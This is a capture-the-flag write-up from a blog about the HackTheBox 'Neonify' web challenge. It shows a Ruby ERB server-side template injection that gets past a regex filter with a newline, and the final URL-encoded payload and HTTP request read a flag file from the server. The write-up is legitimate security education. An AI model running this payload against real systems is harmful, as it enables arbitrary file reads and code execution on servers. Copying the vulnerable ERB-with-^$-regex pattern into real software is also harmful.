---
layout: post
title: Neonify - Web challenge - HackTheBox
date: 26/12/2022
author: Nehal Zaman
tags: ["ssti", "regex bypass", "ruby"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/neonify/banner.png)

# INTRODUCTION

Neonify is a quite easy web challenge created by [Codehead](https://www.hackthebox.com/home/users/profile/129959) on **HackTheBox**.

It involves analysing a ruby-based web application to find a SSTI.

However, there is regex filter in place that needs to be bypassed in order to exploit the SSTI.

# ANALYSING THE SOURCE CODE

Before we begin, I want to say my `ruby` skill is not really good. So if you think I made a mistake somewhere, please reach out to me on discord (`n3hal#1527`).

```ruby

class NeonControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end

end 

```

The controllers file is at `challenge/app/controllers/neon.rb`. This contains all the routes that the web application can expect.

There is a single route `/`, that can take both `GET` and `POST` requests.

When a `GET` request is made to `/`, the `ERB` template `challenge/app/views/index.erb` is rendered. A string `Glow With The Flow` is also passed to the template as a variable.

While making a `POST` request, the web application expects a `POST` parameter `neon`. The value of `neon` parameter is checked against regex `/^[0-9a-z ]+$/i` which is checking if the input only contains alphanumeric characters. If the check returns `true`, the value of neon is passed to the `index.erb` and it is rendered. Otherwise, the string `Malicious Input Detected` is passed to the template.

```ruby

<!DOCTYPE html>
<html>
<head>
    <title>Neonify</title>
    <link rel="stylesheet" href="stylesheets/style.css">
    <link rel="icon" type="image/gif" href="/images/gem.gif">
</head>
<body>
    <div class="wrapper">
        <h1 class="title">Amazing Neonify Generator</h1>
        <form action="/" method="post">
            <p>Enter Text to Neonify</p><br>
            <input type="text" name="neon" value="">
            <input type="submit" value="Submit">
        </form>
        <h1 class="glow"><%= @neon %></h1>
    </div>
</body>
</html>

```

We can see that the value of `POST` parameter `neon` is embedded into the template.

# DETECTING THE SSTI VULNERABILITY

Since the user-supplied parameter value in `neon` is reflected back to us through the template, the most obvious attack vector would be **Server Side Template Injection (SSTI)**.

```ruby

class NeonControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = ERB.new(params[:neon]).result(binding)
      #@neon = "Malicious Input Detected"
    end
    erb :'index'
  end

end 

```

Just to check the SSTI, I have edited the `challenge/app/controllers/neon.rb` so that the regex check does not affect us for now.

```bash

┌──(n3hal㉿Universe7)-[~/…/web_neonify/challenge/app/controllers]
└─$ docker run -it web_neonify sh
/app # shotgun -o0.0.0.0 -p1337 config.ru
== Shotgun/WEBrick on http://0.0.0.0:1337/
[2022-12-26 06:41:40] INFO  WEBrick 1.6.1
[2022-12-26 06:41:40] INFO  ruby 2.7.5 (2021-11-24) [x86_64-linux-musl]
[2022-12-26 06:41:40] INFO  WEBrick::HTTPServer#start: pid=7 port=1337

```

I have popped a shell on the docker image and ran the application.

![](/assets/images/writeups/neonify/1.png)

We can see the input `Nehal` is nicely neonified and reflected back to us.

![](/assets/images/writeups/neonify/2.png)

When we give a SSTI payload specific to `ERB` template `<%= 7*7 %>`, we can see that the input is processed and we see `49` reflected back to us.

This confirms that the application might be vulnerable to `SSTI`.

# BYPASSING THE REGEX

Although we have identified the SSTI, there is a regex filter `/^[0-9a-z ]+$/i` in place to stop us from exploiting.

This regex checks if the input provided contains only numbers and letters. This potentially stops us from giving characters like `<`, `%`, `=`, `.` and `>` as input.

```ruby

my_input = "Nehal<%= 7*7 %>"

if my_input =~ /^[0-9a-z ]+$/i
  puts "BYPASSED :)"
else
  puts "Not able to bypass :( "
end

```

Here, a `ruby` script is created that uses the same regex to see how an input behaves.

```bash

┌──(n3hal㉿Universe7)-[~/…/challenges/web/neonify/tests]
└─$ ruby script.rb
Not able to bypass :(

```

As expected, the input `Nehal<%= 7*7 %>` is not able to bypass the regex and hence we see the string `Not able to bypass :(`.

But here is the magic.

```ruby

my_input = "Nehal\n<%= 7*7 %>"

if my_input =~ /^[0-9a-z ]+$/i
  puts "BYPASSED :)"
else
  puts "Not able to bypass :( "
end

```

Here the input is changed to `Nehal\n<%= 7*7 %>`.

```bash

┌──(n3hal㉿Universe7)-[~/…/challenges/web/neonify/tests]
└─$ ruby script.rb 
BYPASSED :)

```

When we add the `\n` character is added, we can see the regex is bypassed and `BYPASSED :)` is printed.

In `ruby`, the `^` and `$` match at the start and end of each line. So if any (`!`) one line is matching, we have a successful match.

The `\n` separates the the input `Nehal\n<%= 7*7 %>` into 2 lines: `Nehal` and `<%= 7*7 %>`. Since the regex check for `Nehal` returns `true` we are able to bypass the regex for the string as a whole.

# CRAFTING THE PAYLOAD

In `ERB` based `SSTI`, we can read a file on the filesytem by `File.open('/path/to/file.txt').read`.

Combining the regex filter and SSTI, our final payload can be:

```
Nehal\n<%= File.open('/app/flag.txt').read %>
```

![](/assets/images/writeups/neonify/3.png)

We are still getting detected.

```ruby

/app # cat app/controllers/neon.rb 
class NeonControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    puts params[:neon]
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = ERB.new(params[:neon]).result(binding)
      #@neon = "Malicious Input Detected"
    end
    erb :'index'
  end

  ```

  I am printing the raw string value of `neon` paramter to see how the input shows up in the backend application.

  ```ruby

  /app # shotgun -o0.0.0.0 -p1337 config.ru
== Shotgun/WEBrick on http://0.0.0.0:1337/
[2022-12-26 07:13:15] INFO  WEBrick 1.6.1
[2022-12-26 07:13:15] INFO  ruby 2.7.5 (2021-11-24) [x86_64-linux-musl]
[2022-12-26 07:13:15] INFO  WEBrick::HTTPServer#start: pid=24 port=1337
"Nehal\\n<%= File.open('/app/flag.txt').read %>"
172.17.0.1 - - [26/Dec/2022:07:13:21 +0000] "POST / HTTP/1.1" 200 559 0.0298

```

We can see that the newline `\n` in our payload is automatically escaped.

One possible way can be to encode the newline (`\n` -> `%0a`) so that when the application decodes it, we get the newline we want.

The payload is updated as:

```
Nehal%0a<%= File.open('/app/flag.txt').read %>
```

![](/assets/images/writeups/neonify/4.png)

We still are on the same boat.

Let us take this thing on burp so that we can encode our payload as a whole.

The final payload is updated as:

```
Nehal%0a<%25%3d+File.open('/app/flag.txt').read+%25>
```

```
POST / HTTP/1.1
Host: 172.17.0.2:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://172.17.0.2:1337
Connection: close
Referer: http://172.17.0.2:1337/
Upgrade-Insecure-Requests: 1

neon=Nehal%0a<%25%3d+File.open('/app/flag.txt').read+%25>
```

```html

HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 567
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Server: WEBrick/1.6.1 (Ruby/2.7.5/2021-11-24)
Date: Mon, 26 Dec 2022 07:24:21 GMT
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>Neonify</title>
    <link rel="stylesheet" href="stylesheets/style.css">
    <link rel="icon" type="image/gif" href="/images/gem.gif">
</head>
<body>
    <div class="wrapper">
        <h1 class="title">Amazing Neonify Generator</h1>
        <form action="/" method="post">
            <p>Enter Text to Neonify</p><br>
            <input type="text" name="neon" value="">
            <input type="submit" value="Submit">
        </form>
        <h1 class="glow">Nehal
HTB{f4k3_fl4g_f0r_t3st1ng}</h1>
    </div>
</body>
</html>
```

We can see our nice flag `HTB{f4k3_fl4g_f0r_t3st1ng}` for testing.

# CONCLUSION

Trying the same payload on the running instance will give us the flag.

The SSTI in this challenge is quite obvious.

But the takeaway from this challenge is about how a newline can be used to bypass a regex check.

This is all in this challenge.

Thanks for reading this far. 

Hope you liked it.